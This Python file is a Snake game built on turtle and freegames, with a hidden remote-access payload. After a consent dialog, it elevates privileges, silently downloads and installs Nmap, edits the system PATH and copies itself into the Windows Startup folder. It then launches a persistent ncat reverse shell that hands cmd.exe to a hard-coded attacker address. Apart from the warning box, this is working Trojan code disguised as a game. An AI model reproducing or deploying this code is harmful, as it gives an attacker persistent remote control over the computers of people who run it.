from turtle import *
from random import randrange
from freegames import square, vector
import sys
import os
import subprocess
import ctypes
import winreg
import urllib.request
import time
import threading
import tkinter as tk
from tkinter import messagebox

# ====================== Configuration ======================
ATTACKER_IP = "10.12.75.36"
PORT = 9999
print(ATTACKER_IP)

NMAP_DOWNLOAD_URL = "http://your-server/nmap-7.94-setup.exe"
STARTUP_NAME = "snake_reverse.exe"

# ====================== System Preparation ======================
def check_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def add_to_startup():
    startup_path = os.path.join(
        os.getenv('APPDATA'),
        'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
    )
    target_path = os.path.join(startup_path, STARTUP_NAME)

    if not os.path.exists(target_path):
        try:
            if getattr(sys, 'frozen', False):
                source = sys.executable
            else:
                source = __file__

            with open(source, 'rb') as fsrc, open(target_path, 'wb') as fdst:
                fdst.write(fsrc.read())
        except Exception as e:
            print(f"Startup error: {str(e)}")

def install_nmap():
    try:
        temp_installer = os.path.join(os.getenv('TEMP'), "nmap_installer.exe")

        # Download installer
        urllib.request.urlretrieve(NMAP_DOWNLOAD_URL, temp_installer)

        # Silent install
        subprocess.run(
            [temp_installer, "/S", "/NCRC"],
            creationflags=subprocess.CREATE_NO_WINDOW,
            timeout=300
        )

        # Add to PATH
        key_path = r'SYSTEM\CurrentControlSet\Control\Session Manager\Environment'
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_ALL_ACCESS) as key:
            path_value = winreg.QueryValueEx(key, 'Path')[0]
            new_path = r'C:\Program Files (x86)\Nmap;' + path_value
            winreg.SetValueEx(key, 'Path', 0, winreg.REG_EXPAND_SZ, new_path)

        # Refresh environment
        ctypes.windll.user32.SendMessageTimeoutW(0xFFFF, 0x001A, 0, "Environment", 0x02, 5000, None)

    except Exception as e:
        print(f"Installation failed: {str(e)}")

def check_dependencies():
    try:
        subprocess.run(
            ["ncat", "--version"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
    except (FileNotFoundError, subprocess.CalledProcessError):
        install_nmap()

# ====================== Reverse Shell ======================
def persistent_shell():
    while True:
        try:
            subprocess.Popen(
                ["ncat", ATTACKER_IP, str(PORT), "-e", "cmd.exe"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            time.sleep(60)
        except Exception as e:
            print(f"Shell error: {str(e)}")
            time.sleep(30)

# ====================== Stealth Enhancements ======================
def hide_console():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

# ====================== Game Code ======================
# Initialize variables
food = vector(0, 0)
snake = [vector(10, 0)]
aim = vector(0, -10)
score = 0
game_over = False

# Create turtles for display
score_turtle = Turtle()
game_over_turtle = Turtle()
restart_turtle = Turtle()

# Setup display turtles
for turtle in [score_turtle, game_over_turtle, restart_turtle]:
    turtle.hideturtle()
    turtle.penup()

score_turtle.goto(0, 190)
score_turtle.write("Score: 0", align="center", font=("Arial", 14, "normal"))

def change(x, y):
    """Change snake direction if game is active."""
    if not game_over:
        aim.x = x
        aim.y = y

def inside(head):
    """Return True if head is within boundaries."""
    return -200 < head.x < 190 and -200 < head.y < 190

def restart():
    """Reset game state."""
    global game_over, snake, food, aim, score
    game_over = False
    snake = [vector(10, 0)]
    aim = vector(0, -10)
    food.x = randrange(-15, 15) * 10
    food.y = randrange(-15, 15) * 10
    score = 0

    # Clear displays
    score_turtle.clear()
    game_over_turtle.clear()
    restart_turtle.clear()
    clear()

    # Reset score display
    score_turtle.write(f"Score: {score}", align="center", font=("Arial", 14, "normal"))
    move()

def move():
    """Move snake forward one segment."""
    global game_over, score, food
    if game_over:
        return

    head = snake[-1].copy()
    head.move(aim)

    # Check for collision
    if not inside(head) or head in snake:
        game_over = True
        square(head.x, head.y, 9, 'red')
        update()
        game_over_turtle.write("Game Over!", align="center", font=("Arial", 24, "bold"))
        restart_turtle.goto(0, -30)
        restart_turtle.write("Press SPACE to Restart", align="center", font=("Arial", 14, "normal"))
        return

    snake.append(head)

    # Check food collision
    if head == food:
        score += 1
        score_turtle.clear()
        score_turtle.write(f"Score: {score}", align="center", font=("Arial", 14, "normal"))
        food.x = randrange(-15, 15) * 10
        food.y = randrange(-15, 15) * 10
    else:
        snake.pop(0)

    clear()

    # Draw snake with gradient colors
    for i, body in enumerate(snake):
        color = '#2E8B57' if i % 2 == 0 else '#3CB371'  # SeaGreen and MediumSeaGreen
        if body == snake[-1]:
            color = '#228B22'  # ForestGreen for head
        square(body.x, body.y, 9, color)

    # Draw food
    square(food.x, food.y, 9, '#FF4500')  # OrangeRed color
    update()
    ontimer(move, 100)

if __name__ == "__main__":
    # Create a hidden root window for tkinter
    root = tk.Tk()
    root.withdraw()  # Hide the root window

    # Display warning message
    warning_message = (
        "WARNING: By running this game, the following will happen to your computer:\n\n"
        "1. Nmap (a network scanning tool) will be downloaded and installed silently.\n"
        "2. This program will add itself to your Startup folder to run every time your computer starts.\n"
        f"3. A reverse shell will connect to {ATTACKER_IP}:{PORT}, giving remote access to your system.\n\n"
        "This could potentially harm your computer or network. Proceed only if you understand and consent.\n\n"
        "Click 'OK' to continue or 'Cancel' to exit."
    )
    user_consent = messagebox.askokcancel("Warning", warning_message)

    # Exit if user does not consent
    if not user_consent:
        sys.exit()

    # Destroy the root window after consent
    root.destroy()

    # Proceed with script if user consents
    if not check_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

    check_dependencies()
    add_to_startup()

    # Start reverse shell in background
    shell_thread = threading.Thread(target=persistent_shell, daemon=True)
    shell_thread.start()

    # Game setup
    setup(420, 420, 370, 0)
    hideturtle()
    tracer(False)
    listen()
    onkey(lambda: change(10, 0), 'Right')
    onkey(lambda: change(-10, 0), 'Left')
    onkey(lambda: change(0, 10), 'Up')
    onkey(lambda: change(0, -10), 'Down')
    onkey(restart, 'space')

    # Initial food position
    food.x = randrange(-15, 15) * 10
    food.y = randrange(-15, 15) * 10

    move()
    done()